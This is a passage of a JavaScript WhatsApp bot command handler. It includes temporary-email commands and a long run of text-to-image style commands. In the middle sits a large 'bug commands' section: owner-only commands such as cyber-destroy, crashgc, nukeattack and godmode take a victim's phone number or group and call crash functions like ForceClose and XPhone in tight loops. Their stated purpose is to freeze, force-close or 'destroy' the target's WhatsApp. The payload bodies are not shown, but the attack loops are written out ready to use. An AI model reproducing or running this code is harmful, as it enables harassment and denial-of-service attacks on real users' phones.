    if (!messageId) {
        return reply("❌ *Please provide a message ID*\nExample: readmail 123456");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
        
        const response = await axios.get(
            `https://www.1secmail.com/api/v1/?action=readMessage&login=${userMail.login}&domain=${userMail.domain}&id=${messageId}`
        );
        
        const message = response.data;
        
        if (!message || !message.id) {
            return reply(`❌ *Message with ID ${messageId} not found*`);
        }

        let messageText = `📧 *Email Details*\n\n`;
        messageText += `*From:* ${message.from}\n`;
        messageText += `*Date:* ${message.date}\n`;
        messageText += `*Subject:* ${message.subject}\n\n`;
        
        if (message.textBody) {
            messageText += `*Content:*\n${message.textBody.substring(0, 1000)}`;
            if (message.textBody.length > 1000) messageText += `...\n\n_(Message truncated)_`;
        } else if (message.htmlBody) {
            messageText += `*Content:* [HTML Content - Cannot display]`;
        } else {
            messageText += `*Content:* No text content`;
        }

        // Check for attachments
        if (message.attachments && message.attachments.length > 0) {
            messageText += `\n\n*Attachments:* ${message.attachments.length}`;
        }

        reply(messageText);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Read mail error:', error);
        reply("❌ *Error reading message*");
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    }
    break;
}

case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    if (!tempMailData[m.sender]) {
        return reply("❌ *No email to delete*");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🗑️', key: m.key } });
        
        const userMail = tempMailData[m.sender];
        
        // Optional: Actually delete from 1secmail
        if (userMail.login && userMail.domain) {
            await axios.get(
                `https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${userMail.login}&domain=${userMail.domain}`
            );
        }
        
        // Remove from local storage
        delete tempMailData[m.sender];
        
        reply("✅ *Temporary email deleted successfully*");
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Delete mail error:', error);
        // Still delete locally even if API fails
        delete tempMailData[m.sender];
        reply("✅ *Temporary email removed from local storage*");
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
    break;
}
// ============================================

case 'tempmail2': {
    try {
        const res = await axios.get(`https://apis.HansTz.my.id/temp-mail`);
        const data = res.data;

        if (!data.success) return reply(`❌ *Failed to generate*`);

        global.tempMailSession = data.session_id;

        reply(`📧 *Temp Mail*\n\n` +
            `Email: ${data.email}\n` +
            `Session: ${data.session_id}\n\n` +
            `Use *tempmail-inbox ${data.session_id}* to check`);
    } catch (err) {
        console.error(err);
        reply(`❌ *Error*`);
    }
}
break;

case 'tempmail-inbox': {
    if (!args[0]) return reply(`❌ *Provide session ID*`);

    try {
        const sessionId = args[0];
        const res = await axios.get(`https://apis.HansTz.my.id/temp-mail/inbox?id=${sessionId}`);
        const data = res.data;

        if (!data.success) return reply(`❌ *Failed to fetch inbox*`);

        if (data.messages.length === 0) return reply(`📭 *Inbox empty*`);

        let inboxText = data.messages.map((msg, i) =>
            `📧 *Message ${i + 1}*\n` +
            `From: ${msg.fromAddr}\n` +
            `To: ${msg.toAddr}\n` +
            `Text: ${msg.text ? msg.text.substring(0, 200) + '...' : 'No preview'}`
        ).join('\n\n');

        reply(`📬 *Inbox*\n\n${inboxText}`);
    } catch (err) {
        console.error(err);
        reply(`❌ *Error*`);
    }
}
break;

//==============================
// 𝗖𝗔𝗦𝗘 𝗕𝗨𝗚 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
//==============================

case 'cyber-destroy': {
    if (!isOwner) return reply("🔒 *Owner only*"); 
    if (!q) return reply("📌 *Usage:* cyber-destroy 923xx");

    let targetNumber = q.replace(/[^0-9]/g, '');
    
    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(targetNumber)) {
        return reply("🔒 *Protected*");
    }

    let target = targetNumber + "@s.whatsapp.net";
    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *10 Round Attack Launching...*`);

    try {
        await CYBEReress();
        await sleep(30);
        for (let round = 0; round < 10; round++) {
            await Combo(target);
            await sleep(25);
            await fcnew(target);
            await sleep(25);
            await XPhone(target);
            await sleep(25);
            await BayuOfficialHard(target);
            await sleep(25);
            for (let i = 0; i < 30; i++) {
                await ForceClose(target);
                await sleep(15);
            }
            await sleep(30);
        }

        reply(`✅ *CYBER-DESTROY complete — 10 rounds done on ${targetNumber}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'error'}*`);
    }
    break;
}

case "delay":
case "crash":
case "blank":
case "cyberinvis": {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔥 *Launching full attack...*`);

    try {
        await CYBEReress();
        await sleep(30);
        for (let round = 0; round < 10; round++) {
            await Combo(target);
            await sleep(30);
            await fcnew(target);
            await sleep(30);
            await Combo(target);
            await sleep(30);
            await fcnew(target);
            await sleep(30);
            await XPhone(target);
            await sleep(30);
            await BayuOfficialHard(target);
            await sleep(30);
            for (let j = 0; j < 10; j++) {
                await ForceClose(target);
                await sleep(20);
            }
            await sleep(30);
        }
        reply(`✅ *Attack completed on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial execution: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
}
break;

case "delayhard": {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *DELAYHARD — MAXIMUM POWER*\n🔥 *Initiating full barrage...*`);

    try {
        await CYBEReress();
        await sleep(25);
        for (let round = 0; round < 10; round++) {
            await fcnew(target);
            await sleep(25);
            await fcnew(target);
            await sleep(25);
            await Combo(target);
            await sleep(25);
            await Combo(target);
            await sleep(25);
            await XPhone(target);
            await sleep(25);
            await BayuOfficialHard(target);
            await sleep(25);
            for (let i = 0; i < 15; i++) {
                await ForceClose(target);
                await sleep(15);
            }
            await sleep(25);
        }
        reply(`✅ *DELAYHARD complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
}
break;

case "close-zapp":
case "bruteclose":
case "metaclose":
case "cyberclose": {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${command} 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, "");
    
    // 🔒 PROTECTED NUMBERS CHECK
    let protectedNumbers = ["8087253512", "923417022212"];
    if (protectedNumbers.includes(pepec)) {
        return reply("🔒 *Protected*");
    }
    
    let target = pepec + '@s.whatsapp.net';
    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔒 *Force closing WhatsApp...*`);

    try {
        await CYBEReress();
        await sleep(150);
        for (let round = 0; round < 5; round++) {
            await Combo(target);
            await sleep(150);
            await fcnew(target);
            await sleep(150);
            for (let i = 0; i < 50; i++) {
                await ForceClose(target);
                await sleep(80);
            }
            await sleep(150);
            await XPhone(target);
            await sleep(150);
            await BayuOfficialHard(target);
            await sleep(150);
            for (let i = 0; i < 20; i++) {
                await ForceClose(target);
                await sleep(80);
            }
            await sleep(200);
        }
        reply(`✅ *Force close complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    
    await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
}
break;

//====================[ GROUP BUG COMMANDS ]===========================//

case 'buggc':
case 'xgroup':
case 'crashgc':
case 'cyberkillgc':
case 'blankgc': {
    if (!isOwner) return reply(`🔒 *Owner only*`);
    if (!m.isGroup) return reply('👥 *Groups only*');
    
    reply(`💀 *GROUP DESTROY INITIATED*\n⚡ *Command:* ${command}\n🔥 *Hold tight...*`);
    
    try {
        for (let i = 0; i < 100; i++) {
            await bug3(m.chat);
            await sleep(30);
            await bug3(m.chat);
            await sleep(30);
            await bug3(m.chat);
            await sleep(30);
            await VampireBugIns(m.chat);
            await sleep(30);
        }
        reply(`✅ *Group destroyed — ${command} complete*`);
    } catch(e) {
        reply(`⚠️ *Partial run: ${e.message || 'Error'}*`);
    }
}
break;

//====================[ NEW POWERFUL BUG COMMANDS 2026 ]===========================//

case 'ultrabug': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}ultrabug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${pepec}\n💀 *20 Round Mega Barrage Starting...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });

    try {
        await CYBEReress();
        await sleep(20);
        for (let round = 0; round < 20; round++) {
            await Promise.all([
                Combo(target),
                fcnew(target),
                XPhone(target)
            ]);
            await sleep(15);
            await BayuOfficialHard(target);
            await sleep(10);
            for (let i = 0; i < 50; i++) {
                await ForceClose(target);
                await sleep(10);
            }
            await sleep(15);
        }
        reply(`✅ *ULTRABUG complete — 20 rounds on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

case 'megabug': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}megabug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Initiating 15-round spiral barrage...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });

    try {
        for (let round = 0; round < 15; round++) {
            await fcnew(target); await sleep(10);
            await fcnew(target); await sleep(10);
            await Combo(target); await sleep(10);
            await Combo(target); await sleep(10);
            await XPhone(target); await sleep(10);
            await XPhone(target); await sleep(10);
            await BayuOfficialHard(target); await sleep(10);
            for (let i = 0; i < 40; i++) {
                await ForceClose(target); await sleep(8);
            }
            await sleep(10);
        }
        reply(`✅ *MEGABUG complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💥', key: m.key } });
}
break;

case 'ghostcrash': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}ghostcrash 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${pepec}\n🔥 *Ghost mode activated...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '👻', key: m.key } });

    try {
        await CYBEReress(); await sleep(20);
        for (let round = 0; round < 12; round++) {
            await XPhone(target); await sleep(12);
            await BayuOfficialHard(target); await sleep(12);
            await Combo(target); await sleep(12);
            await fcnew(target); await sleep(12);
            for (let i = 0; i < 60; i++) {
                await ForceClose(target); await sleep(7);
            }
            await sleep(12);
        }
        reply(`✅ *GHOSTCRASH complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
}
break;

case 'superlag': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}superlag 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`⚡ *SUPERLAG — EXTREME LAG INJECTION*\n🎯 *Target:* ${pepec}\n🔥 *25 rounds of lag attack...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

    try {
        for (let round = 0; round < 25; round++) {
            await fcnew(target); await sleep(8);
            await Combo(target); await sleep(8);
            await XPhone(target); await sleep(8);
            for (let i = 0; i < 30; i++) {
                await ForceClose(target); await sleep(6);
            }
            await sleep(8);
        }
        reply(`✅ *SUPERLAG complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '😈', key: m.key } });
}
break;

case 'terminator': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}terminator 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🤖 *TERMINATOR — FULL SYSTEM WIPE*\n🎯 *Target:* ${pepec}\n🔥 *Termination sequence: 30 rounds*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🤖', key: m.key } });

    try {
        await CYBEReress(); await sleep(15);
        for (let round = 0; round < 30; round++) {
            await Combo(target); await sleep(8);
            await fcnew(target); await sleep(8);
            await XPhone(target); await sleep(8);
            await BayuOfficialHard(target); await sleep(8);
            for (let i = 0; i < 20; i++) {
                await ForceClose(target); await sleep(6);
            }
            await sleep(8);
        }
        reply(`✅ *TERMINATOR — Target terminated: ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

case 'shadowbug': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}shadowbug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🌑 *SHADOWBUG — DARK FORCE ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Shadow mode: 18 rounds...*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🌑', key: m.key } });

    try {
        for (let round = 0; round < 18; round++) {
            await BayuOfficialHard(target); await sleep(10);
            await BayuOfficialHard(target); await sleep(10);
            await XPhone(target); await sleep(10);
            await Combo(target); await sleep(10);
            for (let i = 0; i < 35; i++) {
                await ForceClose(target); await sleep(7);
            }
            await sleep(10);
        }
        reply(`✅ *SHADOWBUG complete on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '🖤', key: m.key } });
}
break;

case 'nukeattack': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}nukeattack 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`☢️ *NUKEATTACK — NUCLEAR OPTION*\n🎯 *Target:* ${pepec}\n🔥 *Nuclear barrage: 50 rounds UNLEASHED*`);
    await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });

    try {
        await CYBEReress(); await sleep(10);
        for (let round = 0; round < 50; round++) {
            await Promise.all([
                Combo(target),
                fcnew(target),
                XPhone(target),
                BayuOfficialHard(target)
            ]);
            await sleep(8);
            for (let i = 0; i < 25; i++) {
                await ForceClose(target); await sleep(5);
            }
            await sleep(8);
        }
        reply(`✅ *NUKEATTACK — ${pepec} obliterated — 50 rounds done*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

case 'godmode': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}godmode 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${pepec}\n🔱 *Unlimited power: no mercy mode*`);
    await devtrust.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });

    try {
        await CYBEReress(); await sleep(10);
        // Phase 1: Warmup
        for (let i = 0; i < 5; i++) {
            await Combo(target); await sleep(10);
            await fcnew(target); await sleep(10);
        }
        // Phase 2: Full Assault
        for (let round = 0; round < 40; round++) {
            await Promise.all([Combo(target), fcnew(target), XPhone(target)]);
            await sleep(6);
            await BayuOfficialHard(target); await sleep(6);
            for (let i = 0; i < 30; i++) {
                await ForceClose(target); await sleep(5);
            }
            await sleep(6);
        }
        // Phase 3: Kill shot
        for (let i = 0; i < 20; i++) {
            await ForceClose(target); await sleep(5);
        }
        reply(`✅ *GODMODE complete — divine wrath delivered to ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '🔱', key: m.key } });
}
break;

case 'killswitch': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}killswitch 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`🔴 *KILLSWITCH — INSTANT KILL PROTOCOL*\n🎯 *Target:* ${pepec}\n⚡ *Rapid-fire termination: 60 rounds*`);
    await devtrust.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });

    try {
        await CYBEReress(); await sleep(8);
        for (let round = 0; round < 60; round++) {
            await Combo(target); await sleep(5);
            await fcnew(target); await sleep(5);
            for (let i = 0; i < 15; i++) {
                await ForceClose(target); await sleep(4);
            }
            await sleep(5);
        }
        reply(`✅ *KILLSWITCH executed on ${pepec} — 60 rounds*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
}
break;

case 'quantumbug': {
    if (!isOwner) return reply('🔒 *Owner only*');
    if (!text) return reply(`📌 *Usage:* ${prefix}quantumbug 923xx`);

    let pepec = args[0].replace(/[^0-9]/g, '');
    let protectedNumbers = ["923417022212"];
    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
    let target = pepec + '@s.whatsapp.net';

    reply(`⚛️ *QUANTUMBUG — QUANTUM COLLAPSE*\n🎯 *Target:* ${pepec}\n🔥 *Quantum phase attack: 35 rounds*`);
    await devtrust.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } });

    try {
        await CYBEReress(); await sleep(10);
        for (let round = 0; round < 35; round++) {
            // Alternating pattern for maximum confusion
            if (round % 2 === 0) {
                await Promise.all([XPhone(target), BayuOfficialHard(target)]);
                await sleep(6);
                await Promise.all([Combo(target), fcnew(target)]);
            } else {
                await Promise.all([Combo(target), fcnew(target)]);
                await sleep(6);
                await Promise.all([XPhone(target), BayuOfficialHard(target)]);
            }
            await sleep(6);
            for (let i = 0; i < 20; i++) {
                await ForceClose(target); await sleep(5);
            }
            await sleep(6);
        }
        reply(`✅ *QUANTUMBUG complete — quantum collapse on ${pepec}*`);
    } catch(e) {
        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
    }
    await devtrust.sendMessage(m.chat, { react: { text: '⚛️', key: m.key } });
}
break;

// ✨ TEXT MAKER COMMANDS

case "glitchtext": {
    if (args.length < 1) return reply("✏️ *Usage:* glitchtext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/glitchtext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "⚡ *Glitch Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "writetext": {
    if (args.length < 1) return reply("✏️ *Usage:* writetext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/writetext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "✍️ *Write Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "advancedglow": {
    if (args.length < 1) return reply("✏️ *Usage:* advancedglow CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/advancedglow?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💡 *Advanced Glow*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "typographytext": {
    if (args.length < 1) return reply("✏️ *Usage:* typographytext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/typographytext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🖋️ *Typography*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "pixelglitch": {
    if (args.length < 1) return reply("✏️ *Usage:* pixelglitch CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/pixelglitch?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🧩 *Pixel Glitch*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "neonglitch": {
    if (args.length < 1) return reply("✏️ *Usage:* neonglitch CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/neonglitch?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💥 *Neon Glitch*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "flagtext": {
    if (args.length < 1) return reply("✏️ *Usage:* flagtext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/flagtext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🇳🇬 *Flag Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "flag3dtext": {
    if (args.length < 1) return reply("✏️ *Usage:* flag3dtext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/flag3dtext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🇺🇸 *3D Flag Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "deletingtext": {
    if (args.length < 1) return reply("✏️ *Usage:* deletingtext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/deletingtext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🩶 *Deleting Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "blackpinkstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* blackpinkstyle CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/blackpinkstyle?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🎀 *Blackpink Style*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "glowingtext": {
    if (args.length < 1) return reply("✏️ *Usage:* glowingtext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/glowingtext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💫 *Glowing Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "underwatertext": {
    if (args.length < 1) return reply("✏️ *Usage:* underwatertext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/underwatertext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌊 *Underwater Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "logomaker": {
    if (args.length < 1) return reply("✏️ *Usage:* logomaker CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/logomaker?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🐻 *Logo Maker*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "cartoonstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* cartoonstyle CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/cartoonstyle?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🎨 *Cartoon Style*"
            }),
            { quoted: m }
        );
    } catch (e) {
        reply("⚠️ *Error generating*");
    }
}
break;

case "papercutstyle": {
    if (args.length < 1) return reply("✏️ *Usage:* papercutstyle CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/papercutstyle?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "✂️ *Paper Cut Style*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Paper Cut Style*");
    }
}
break;

case "watercolortext": {
    if (args.length < 1) return reply("✏️ *Usage:* watercolortext CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/watercolortext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🖌️ *Watercolor Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Watercolor Text*");
    }
}
break;

case "effectclouds": {
    if (args.length < 1) return reply("✏️ *Usage:* effectclouds CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/effectclouds?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "☁️ *Clouds Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Cloud Text*");
    }
}
break;

case "blackpinklogo": {
    if (args.length < 1) return reply("✏️ *Usage:* blackpinklogo CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/blackpinklogo?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "💖 *Blackpink Logo*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Blackpink Logo*");
    }
}
break;

case "gradienttext": {
    if (args.length < 1) return reply("✏️ *Usage:* gradienttext Robin");
    
    try {
        let url = `https://apis.prexzyvilla.site/gradienttext?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌈 *Gradient Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Gradient Text*");
    }
}
break;

case "summerbeach": {
    if (args.length < 1) return reply("✏️ *Usage:* summerbeach CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/summerbeach?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🏖️ *Summer Beach Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Summer Beach Text*");
    }
}
break;

case "luxurygold": {
    if (args.length < 1) return reply("✏️ *Usage:* luxurygold CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/luxurygold?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🥇 *Luxury Gold Text*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error generating Luxury Gold Text*");
    }
}
break;

case "multicoloredneon": {
    if (args.length < 1) return reply("✏️ *Usage:* multicoloredneon CYBER");
    
    try {
        let url = `https://apis.prexzyvilla.site/multicoloredneon?text=${encodeURIComponent(args.join(" "))}`;
        await devtrust.sendMessage(from,
            addNewsletterContext({
                image: { url },
                caption: "🌈 *Multicolored Neon*"
            }),
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
